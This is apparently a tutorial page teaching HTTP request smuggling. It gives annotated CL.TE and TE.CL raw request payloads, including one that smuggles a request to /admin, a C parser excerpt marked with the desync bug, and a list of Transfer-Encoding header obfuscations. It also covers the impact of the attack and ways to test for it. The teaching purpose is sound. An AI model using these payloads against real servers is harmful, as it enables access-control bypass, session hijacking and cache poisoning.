BROWSER B15 — HTTP REQUEST SMUGGLING

CL.TE & TE.CL

The front-end proxy and back-end server parse HTTP differently. The proxy sees one request; the back-end sees two. The second "request" gets prepended to the next real user's request — poisoning their session, stealing their data, or bypassing access controls.

CL.TE
front=Content-Length, back=Transfer-Encoding
TE.CL
front=Transfer-Encoding, back=Content-Length
desync
request boundary disagreement

01 — The Big Analogy

Head First Moment

Imagine a security guard at the building entrance (front-end proxy) who counts letters by envelope weight (Content-Length). He passes them to a mail sorter in the back (back-end server) who counts letter boundaries by explicit "END OF LETTER" stamps (Transfer-Encoding: chunked). If an attacker uses both counting methods in one envelope, the guard thinks it's one letter; the sorter thinks it's two. The second "letter" gets put in someone else's mailbox.

02 — CL.TE Attack

/* CL.TE: front-end uses Content-Length, back-end uses Transfer-Encoding
   Attacker sends this single HTTP/1.1 request to the proxy: */

POST / HTTP/1.1\r\n
Host: vulnerable.com\r\n
Content-Length: 13\r\n          /* proxy reads 13 bytes of body */
Transfer-Encoding: chunked\r\n  /* proxy ignores (or doesn't see) */
\r\n
0\r\n                           /* chunk: size 0 (end of chunked body) */
\r\n
G                               /* 13th byte — proxy stops here */

/* FRONT-END (proxy) sees: body = "0\r\n\r\nG" (13 bytes), one request.
   Forwards as-is to back-end.

   BACK-END uses TE: chunked.
   Reads: chunk size=0 → body is empty → end of request 1.
   "G" is the START of request 2 — sitting in the back-end's buffer.

   When the next legitimate user sends:
     GET /secret HTTP/1.1\r\n
   Back-end prepends "G" → sees: "GGET /secret HTTP/1.1"
   Parses as method "GGET" → 400 error or routing confusion.

   More dangerous variant: smuggle a full POST with attacker headers */

Front-end sees

POST / (1 request)
Content-Length: 13
body: "0\r\n\r\nG" (smuggled)

Back-end sees

Request 1: POST / (empty body)
Request 2 starts: "G..."
Prepended to next user!

03 — TE.CL Attack

/* TE.CL: front-end uses Transfer-Encoding, back-end uses Content-Length */

POST / HTTP/1.1\r\n
Host: vulnerable.com\r\n
Content-Length: 4\r\n           /* back-end reads only 4 bytes */
Transfer-Encoding: chunked\r\n  /* front-end uses this */
\r\n
7c\r\n                          /* chunk of 124 bytes (hex 7c) */
GET /admin HTTP/1.1\r\n         /* \  these bytes are the chunk body */
Host: vulnerable.com\r\n        /*  \ but only 4 are "official" body */
X-Ignore: X\r\n                 /*  / to back-end via Content-Length */
\r\n                            /* /  */
0\r\n                           /* terminating chunk */
\r\n

/* FRONT-END (TE): sees one chunked request, all 124+4 bytes.
   Strips TE header, forwards with Content-Length: 4.

   BACK-END (CL): reads 4 bytes of body ("7c\r\n"), treats rest
   as next request: "GET /admin HTTP/1.1\r\n..."
   Internal /admin is now requested as if from a legitimate user! */
HTTP/2 Doesn't Save You

HTTP/2 is binary and has no Content-Length/Transfer-Encoding ambiguity — but if the front-end terminates H2 and forwards to a back-end over HTTP/1.1, it must serialize the request. If it writes a Transfer-Encoding header that the back-end respects differently, the H2.TE variant smuggles through. HTTP/2 end-to-end (H2C) eliminates this entirely.

04 — The Parser

/* http_parser.c — body length determination */
int get_body_length(http_request_t *req) {
    const char *te = get_header(req, "Transfer-Encoding");
    const char *cl = get_header(req, "Content-Length");

    /* RFC 7230: if both present, TE wins; CL must be ignored */
    if (te && strstr(te, "chunked"))
        return BODY_CHUNKED;

    if (cl)
        return atoi(cl);

    return 0;  /* no body */
    /* BUG: if front-end obfuscates TE header so it doesn't recognize
       chunked but back-end does — CL.TE desync! */
}

/* Obfuscation that confuses front-ends: */
/* Transfer-Encoding: xchunked       */
/* Transfer-Encoding: chunked, x     */
/* Transfer-Encoding:\x09chunked     */  /* tab before value */
/* Transfer-Encoding: x\r\nTransfer-Encoding: chunked */  /* duplicate */

06 — Brain Exercise

Sharpen Your Pencil

The fix for HTTP smuggling is: if a request has both Content-Length and Transfer-Encoding, reject it with a 400. But many legitimate clients and frameworks send both headers.

An alternative fix: ensure the front-end and back-end agree on which header wins, by configuring both to prefer Transfer-Encoding. Can TE.TE (both use TE) still be exploited? Yes — if the attacker can obfuscate the TE header so the front-end normalises it one way and the back-end another. Design a test suite that sends all known TE obfuscation variants and checks whether front/back disagree.

There Are No Dumb Questions

Q: What can an attacker actually do with request smuggling?
Cache poisoning (serve attacker content to other users), session hijacking (steal another user's cookies by prepending a request that logs them), bypassing access controls (reach internal endpoints via prepended admin requests), reflected XSS amplification (smuggle a response that includes attacker JS into another user's response). PortSwigger's James Kettle documented all major classes in 2019-2023.
Q: Does HTTP/3 (QUIC) have this problem?
No — QUIC/H3 is stream-based with explicit framing built into the protocol. There's no ambiguity between CL and TE because both don't exist in H3. However, if the front-end is H3 and the back-end is still HTTP/1.1 (a common deployment), the translation layer can reintroduce smuggling opportunities at the H3→H1.1 boundary.
